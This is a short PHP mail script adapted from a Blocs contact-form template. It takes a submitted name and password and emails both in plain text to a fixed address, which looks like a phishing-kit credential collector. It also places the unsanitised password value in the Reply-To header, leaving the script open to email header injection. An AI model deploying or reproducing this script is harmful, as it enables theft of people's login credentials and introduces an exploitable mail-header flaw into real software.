<?php	
	if(empty($_POST['name']) && strlen($_POST['name']) == 0 || empty($_POST['password']) && strlen($_POST['password']) == 0)
	{
		return false;
	}
	
	$name = $_POST['name'];
	$password = $_POST['password'];
	
	$to = 'receiver@yoursite.com'; // Email submissions are sent to this email

	// Create email	
	$email_subject = "Message from a Blocs website.";
	$email_body = "You have received a new message. \n\n".
				  "Name: $name \nPassword: $password \n";
	$headers = "MIME-Version: 1.0\r\nContent-type: text/plain; charset=UTF-8\r\n";	
	$headers .= "From: contact@yoursite.com\n";
	$headers .= "Reply-To: $password";	
	
	mail($to,$email_subject,$email_body,$headers); // Post message
	return true;			
?>